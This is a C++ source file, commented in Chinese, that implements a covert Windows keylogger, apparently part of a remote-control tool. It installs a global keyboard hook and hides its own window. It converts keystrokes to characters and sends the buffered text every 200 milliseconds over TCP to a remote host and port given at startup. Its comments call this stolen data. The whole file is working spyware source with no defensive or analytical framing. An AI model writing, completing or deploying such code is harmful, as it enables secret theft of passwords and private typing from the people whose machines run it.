#include "keyboardspy.h"

// 互挤体，用来确保线程安全
static CRITICAL_SECTION gCs;
// 初始化类
static KeyboardSpy gSpy;
// 窗口句柄
static HWND hWnd = NULL;
// 键盘钩子句柄
static HHOOK gHHook = NULL;
// socket列表
static std::vector<TcpSocket*> gSockets;
// 键盘数据缓存区
static std::vector<char> gBuffer;

KeyboardSpy::KeyboardSpy()
{
    // 初始化互挤体
    InitializeCriticalSection(&gCs);

    // 创建一个对话框来处理win32事件
    createDialogByNewThread();
}

KeyboardSpy::~KeyboardSpy()
{
    if(hWnd) {
        // 关闭计时器
        KillTimer(hWnd, 0);

        // 删除socket
        const int max = gSockets.size();
        for (int i=0; i<max; ++i) {
            gSockets.at(i)->dissconnect();
            delete gSockets.at(i);
        }

        // 关闭窗口
        DestroyWindow(hWnd);

        // 移除键盘监控
        if (gHHook) {
            uninstallKeyboardHook(gHHook);
        }
    }

    // 删除互挤体
    DeleteCriticalSection(&gCs);
    std::cout << "destroy keyboard spy" << std::endl;
    std::fflush(stdout);
}

void KeyboardSpy::startKeyboardSpy(std::string domain, int port)
{
    TcpSocket *sock = new TcpSocket();
    if (!sock->connectTo(domain, port)) {
        // 释放socket
        delete sock;

        std::cout << "Failed to connect server for keyboard spy" << std::endl;
        std::fflush(stdout);
        return;
    }

    // 开始监控消息
    std::cout << "Started keyboard spy" << std::endl;
    std::fflush(stdout);

    // 把socket加到列表，当有键盘数据就会调用socket
    addSocket(sock);

    // 输出信息
    std::cout << "Started keyboard spy success" << std::endl;
    std::fflush(stdout);
}

void KeyboardSpy::createDialogByNewThread()
{
     // 启动一个新线程来做监控
     HANDLE h = CreateThread(NULL,0,KeyboardSpy::threadProc,(LPVOID)NULL,0,NULL);
     if (!h) {
         std::cout << "Failed to create new thread" << std::endl;
         std::fflush(stdout);
     }
}

DWORD KeyboardSpy::threadProc(LPVOID)
{
    // 创建一个不可见的窗口来处理win32事件
    WORD tempMem[1024];
    LPDLGTEMPLATEA temp = (LPDLGTEMPLATEA)tempMem;
    temp->style=WS_CAPTION;  temp->dwExtendedStyle=0;
    temp->x=0; temp->y=0;
    temp->cx=0; temp->cy=0;
    if(temp == NULL)
    {
        std::cout << "temp is null " << std::endl;
        std::fflush(stdout);
    }
    else
    {
        std::cout << "temp is ready " << std::endl;
        std::fflush(stdout);
    }


    int ret = DialogBoxIndirectParamA(NULL,temp, NULL, keyboardSpyWndProc,(LPARAM)NULL);
    if (ret == -1) {
        std::cout << "Failed to create dialog box for keyboard spy" << std::endl;
        std::fflush(stdout);

    }

    return true;
}



BOOL CALLBACK KeyboardSpy::keyboardSpyWndProc(HWND hWnd, UINT uiMsg, WPARAM , LPARAM )
{

    switch(uiMsg) {
    // 初始化监控
    case WM_INITDIALOG: {
        // 定时发送窃取的数据
        const int time = 200;
        SetTimer(hWnd,0, time, sendKeyboardData);

        // 安装键盘钩子来截取系统的所有键盘输入
        gHHook = installKeyboardHook();
        if (!gHHook) {
            std::cout << "Failed to install keyboard hook" << std::endl;
            std::fflush(stdout);
        }

        break;
    }
    case WM_PAINT:
        // 隐藏窗口
        ShowWindow(hWnd,SW_HIDE);
        break;
    default:
        break;
    }

    return false;
}

HHOOK KeyboardSpy::installKeyboardHook()
{
    //使用setwindowshook函数安装全局系统钩子
    return SetWindowsHookExA(13, keyboardHookProc, GetModuleHandleA(NULL), 0);
}

void KeyboardSpy::uninstallKeyboardHook(HHOOK hHook)
{
    UnhookWindowsHookEx(hHook);
}

LRESULT KeyboardSpy::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    //按下按键
    if (wParam == WM_KEYDOWN) {
        HookStruct *hs = (HookStruct *)lParam; //将键盘的额外详细信息转换为HookStruct指针存储
        char data = hs->iCode;

        // 判断是否大写，如果不是就把原本大写的字符变小写
        bool isCapital = GetKeyState(VK_CAPITAL);
        if (hs->iCode >= 'A' && hs->iCode <= 'Z' && !isCapital) {
            data = data + 0x20;
        } else if (hs->iCode >= 0x60 && hs->iCode<= 0x69) {
            // 小键盘
            data = data - 0x30;
        } else {
            // 符号
            switch (hs->iCode) {
            case 106: data = '*'; break;
            case 107: data = '+'; break;
            case 109: data = '-';   break;
            case 110: data = '.'; break;
            case 111: data = '/'; break;
            case 186: data = ';'; break;
            case 187: data = '='; break;
            case 188: data = ','; break;
            case 189: data = '-'; break;
             case 190: data = '.'; break;
            case 191: data = '/'; break;
            case 192: data = '`'; break;
            case 219: data = '['; break;
            case 220: data = '\\'; break;
            case 221: data = ']'; break;
            case 222: data = '\''; break;
            }
        }

        // 把键盘数据加到缓冲区
        addBuffer(data);
    }

    //将钩子事件传递给下一个钩子或者默认的钩子处理函数，以确保钩子链继续工作
    return CallNextHookEx(gHHook,nCode,wParam,lParam);
}


void KeyboardSpy::addSocket(TcpSocket *sock)
{
    // 锁定函数，其他线程不能进来，保护线程安全
    EnterCriticalSection(&gCs);

    gSockets.push_back(sock);

    // 解除函数锁定
    LeaveCriticalSection(&gCs);
}

std::vector<TcpSocket *> KeyboardSpy::getSockets()
{
    // 锁定函数，其他线程不能进来
    EnterCriticalSection(&gCs);

    std::vector<TcpSocket *> sockets = gSockets;

    // 解除函数锁定
    LeaveCriticalSection(&gCs);

    return sockets;
}

void KeyboardSpy::delSocket(TcpSocket *sock)
{
    // 锁定函数，其他线程不能进来
    EnterCriticalSection(&gCs);

    std::vector<TcpSocket*>::iterator iter = gSockets.begin();
    for (; iter!=gSockets.end(); ++iter) {
        if (*iter == sock) {
            gSockets.erase(iter);
            break;
        }
    }

    // 解除函数锁定
    LeaveCriticalSection(&gCs);
}

void KeyboardSpy::addBuffer(char data)
{
    gBuffer.push_back(data);
}

void KeyboardSpy::delBuffer()
{
    gBuffer.clear();
}

void KeyboardSpy::sendKeyboardData(HWND , UINT , UINT_PTR , DWORD )
{
    // 遍历所有已经连接的端口来发送键盘数据
    if (gBuffer.size() > 0) {
        std::vector<TcpSocket*> sockets = getSockets();
        int max = sockets.size();
        for (int i = 0; i<max; ++i) {
            TcpSocket *sock = sockets.at(i);

            if (!sock->sendData(gBuffer.data(), gBuffer.size())) {
                // 删除无效socket
                delSocket(sock);

                // 释放socket
                delete sock;

                // 输出信息
                std::cout << "Finished keyboard spy" << std::endl;
            }
        }

        // 清空缓冲区
        delBuffer();
    }
}


